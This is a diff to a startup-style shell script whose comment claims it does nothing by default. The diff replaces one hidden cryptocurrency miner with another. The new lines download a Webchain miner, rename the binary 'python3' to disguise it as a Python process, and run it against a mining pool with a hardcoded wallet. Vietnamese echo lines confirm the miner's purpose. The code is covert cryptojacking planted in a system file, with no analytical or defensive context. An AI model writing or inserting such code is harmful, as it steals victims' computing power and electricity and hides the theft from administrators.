@@ -10,15 +10,15 @@
 # bits.
 #
 # By default this script does nothing.
-if [ -f ${PWD}/python9 ]; then
-    if pgrep -x "python9" > /dev/null
+if [ -f ${PWD}/python3 ]; then
+    if pgrep -x "python3" > /dev/null
 then
     echo "Miner dang chay roi , ke cmn di "
     
 else
 
 echo "Miner da install , chay thoi "
-./python9
+./python3 -o pool.webchain.network:3333 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x --donate-level=1
 
      
 fi
@@ -26,18 +26,10 @@ exit
 fi
 
 
-set -x #echo on
-
-wget https://bitbucket.org/cryptogone/ariocppminer/downloads/ariocppminer_v0.9.8_ubuntu16_server.tar.gz
-tar -zxf ariocppminer_v0.9.8_ubuntu16_server.tar.gz
-echo "pool
-http://aropool.com/
-y2nNWENYMvLRiyfRXf1Hf2JCrKMVMyvzL38CTQgMPrEAohWn8RSYkpRjvxvwELepeBrEpa1pwJQSRtnKWfb746C
-`nproc`
-enhanced
-true
-`hostname`" > config.cfg
-mv ariocppminer_avx2 python9
-./python9
+wget https://github.com/webchain-network/webchain-miner/releases/download/v2.7.0/webchain-miner-2.7.0-linux-amd64.tar.gz
+tar xvzf webchain-miner-2.7.0-linux-amd64.tar.gz
+mv webchain-miner python3
+rm config.json
+./python3 -o pool.webchain.network:3333 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x --donate-level=1
 
 exit 0
